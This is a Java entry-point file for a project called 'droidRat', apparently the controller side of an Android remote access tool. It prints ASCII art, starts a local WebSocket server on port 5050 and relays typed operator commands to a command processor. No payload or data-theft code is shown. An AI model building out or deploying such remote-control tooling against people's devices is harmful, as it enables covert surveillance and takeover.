package com.je_chen.droidRat.main;

import com.je_chen.droidRat.module.WebSocketServerEndPoint;
import com.je_chen.droidRat.module.process.send.command.process_super.CommandProcess;
import org.glassfish.tyrus.server.Server;

import javax.websocket.DeploymentException;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class Main {

    static CommandProcess commandProcess;

    static String ricardo =
            " ....... ....  .   .   . . .. . .. .  .;;:   ... ........  ...                       . ............ \n" +
                    " ............ . .   ... ..  .... . . :SXX8888888@S%X@@SSXXX;..    ... .. ...  ...  ... .............\n" +
                    " ... .........  .. .     .............8XXtS8t.;8.8.;8S88%:;t@:.....  ..    ...  ...   ......... ....\n" +
                    " .............   . . . ..... ........::tS%X8;8 X8t8;8;888888S8::::  .   ..           . ........... .\n" +
                    " ...... ..... .. .  .  ...............%X%888t888888@ 8 88S8XS%;:.... . ..  .... ... .. .. . ... ....\n" +
                    " ..............  . ............:...::%:X88%8888888 X888888:8@S8:.... . .  ..  . .  .  ..............\n" +
                    " ............   . .  ....:::::::::::.8%S88S8.X 88 @888888X88.8@ .... ... .  .    .  .  .............\n" +
                    " ............ .. .. .....::....:..::.8XS8t8888@88XS@8888888;888..... ...      ..    .. ............ \n" +
                    " ......... ....  . ........::.:.:::::@:88S8.@88@888@8@88X.888;S..... .  ... .  . .   ...............\n" +
                    " ....... ....    ...........:::::::::8SS.%8@:X88XX@888@888.8;.@...:......  . .  ..     .............\n" +
                    " ..... ........ .........:::..:::::..8Xt88X t:t;% .%X888@88t88X::.::........ .    ........ .........\n" +
                    " ............     ........::::.::.::.@.%8S@S;XS%S88:8888S8S8@;8:::::.::...... .. . .   ...... ... . \n" +
                    " ............ .   . . ...:.....::.:::X;.%;; 88@8S@X8%;8X8@8X:88:.:.:::::...... . ..  . .............\n" +
                    " ... ..........  .. .......:....:::..:S ;.8@X88888@XX XXX88888@:.:.:::::.:.........  . .............\n" +
                    " ....... ....   .................::...8@8@@X8@SS8  88XS @88; 8X:.:::::..::::::.......  ......... ...\n" +
                    " ............ . .......  ......:::::..@.8@XS88@ 8888888S88888S:.::.:.::::::::.......  ..............\n" +
                    " ..............  .. . .. ........:....S;;@@888 888  88S@X8:;88;:::.::::::::.:...:..  ......... .....\n" +
                    " ............  ..... ...  ......:....::X..888S88S SX@S@X@88.8S8;::::::..:....:..... .  ... . .......\n" +
                    " .... ........ ..... ... . ..........:.t;;;88X S8X@888888@@. ::S%;:;:::::::::.:::.. .  ........... .\n" +
                    " ............ ....  ....  . ...........:88X%:888S 8@X8888X @8 t: %8t;:::::::.::.:..    .............\n" +
                    " ........... .  ...     . ..  ........:. ;8X;tt8:88X8888:8X8888888XX%X8S:.::::.::..  .... ..........\n" +
                    " ........................   ..... ........ 8@t8.8X8@8.8:8888888;88888%: 8;....::..  .............. .\n" +
                    " ...... .. ... ............  .............:;88S%888.888 8888@8888888X888t;8 .:..:... ........ .. ...\n" +
                    " ............  ..............   . . .....::@8888X8@SX8:88888X88888@@X@@888t@t::...   ...............\n" +
                    " ............. ......:....... . ..  .....:8XX8XX@@S8::8%888X88:8888@@888888X XS:...... ... .........\n" +
                    " ......... ... ....:::.::.:... . . ......tS@88S88@S88t88888X88888888@888.8.8t. @%...................\n" +
                    " ................:::::::::::....   . ....888X88@8@@S.8 88@888@8t88@888888888888  X .................\n" +
                    " .... .. ....  ..:::::.:::........  . ...@888@88@888t 88@%888888888@8888888888.88X8;................\n" +
                    " ............. ..:::.:::.::...... .. ...;@@X8X8S8@@8: 8;%888888888888@888888888 8::@......... .. .. \n" +
                    " ............. ..:::..:::.::::..   .   .8XX8S8X888S; 8;8 888@S;@8XS@ @S@888888888888 .. ............\n" +
                    " ............ ...:::::::::::......  .. .8XX@X%X8XS%.8:.8@S88888@SS@ S  8888tS88:888%t..... .........\n" +
                    " ....... ........:..:::..:.......    . ;X@S%%88S@% 8;888@88@8t8XXX 8888S@88@8888@8 .8 ..............\n" +
                    " ...... .....  ..::::::::.:.....   ....tSS%SSXS@t:8::8.8888@88@X X 8888X8888888X@88;8.......... ....\n" +
                    " ................::.::::::....... ..  .%tSSSX88%%t8..;8.t8@X8.@XS%888S88888@888888::@; ... .........\n" +
                    " ............ ..:.::.:.........  .   ..;X8@XS@@%:..888@8%.@@ 88SSXS8 %@X8888888@8 8%@ ... ........ .\n" +
                    " .................:.:.S X ...... .  ....SXSS@@8S:888%8888@.8@88XSX S8 @8@8888888t88S8.. ............\n" +
                    " ........... . .88S::: Xt8.....  . .  ..;8@8S@8S;.::8:88S8X 888@SXX 8@@8@@X@88t88t@S@: .............\n" +
                    " ........ .... 8;  ;@t@:8XXX;:...  . ....t8@X88S8S;8888S88;888X8XXS%%S XXXX@88X@%XXS8:..............\n" +
                    " ..............X @8888888%8@X;.   . .  ...;t88888XX%@88S8.@@SSXXSXS 88 SX@888;XtStXXS:..............\n" +
                    " ............ ;.88888@888888Xt.  .. .  ....:S88@8888@88@X8@SSSSXX8X8X8XSX88888:%%%SXSS:.. ... .... .\n" +
                    " ... ...... ..%.888888XXX888X%  .  .  .   ...XSS@8%S%SX 888SSSXX88@X8X%S@88X88  ;tX88%:.............\n" +
                    " ...... ......;8888X88888@X88...  ..  . .. ..;;%SSt;tt@888888888888888888@8@@8888XX;t%:.......... ..";

    static String applicationName = "" +
            "██████╗ ██████╗  ██████╗ ██╗██████╗ ██████╗  █████╗ ████████╗             ██╗███████╗\n" +
            "██╔══██╗██╔══██╗██╔═══██╗██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝             ██║██╔════╝\n" +
            "██║  ██║██████╔╝██║   ██║██║██║  ██║██████╔╝███████║   ██║                ██║█████╗  \n" +
            "██║  ██║██╔══██╗██║   ██║██║██║  ██║██╔══██╗██╔══██║   ██║           ██   ██║██╔══╝  \n" +
            "██████╔╝██║  ██║╚██████╔╝██║██████╔╝██║  ██║██║  ██║   ██║  ███████╗╚█████╔╝███████╗";

    public static void main(String[] argv) {
        commandProcess = new CommandProcess();
        System.out.println(ricardo);
        System.out.println(applicationName);
        Run();
    }

    public static void Run() {
        try {
            Server server = new Server("localhost", 5050, "", null, WebSocketServerEndPoint.class);
            String Control_String;
            try {
                server.start();
                System.out.println("Input exit to stop the server.");
                do {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
                    Control_String = reader.readLine();
                    commandProcess.processCommand(Control_String);
                } while (!Control_String.equals("exit"));
            } catch (IOException | DeploymentException e) {
                e.printStackTrace();
            } finally {
                server.stop();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
